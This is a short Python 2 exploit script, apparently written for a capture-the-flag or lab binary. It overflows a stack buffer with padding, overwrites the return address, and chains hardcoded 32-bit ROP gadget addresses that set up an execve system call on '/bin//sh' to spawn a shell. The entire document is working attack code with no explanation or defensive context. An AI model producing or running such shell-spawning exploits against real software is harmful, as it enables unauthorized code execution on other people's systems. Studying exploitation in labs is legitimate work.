from struct import pack
def p(n):
    return pack("<I", n)

padding = '\x41' * 100 + p(0xbffef258) # padded til $ebp + 4  (ret address)
buf = 0xbffef1cc
edi = 0x8049770
inca = p(0x8050bbc) + p(edi)
intrupt = 0x8057ae0
gadgets = p(0x8052e80) + p(0x805733a) + p(buf+8) + p(0x8080866) + p(buf) + p(0x808e7cb) + p(buf) + p(edi) + p(0x80852ed) + inca*11 + p(intrupt) + p(0x08048f48)
print '/bin' + '//sh' + padding + gadgets

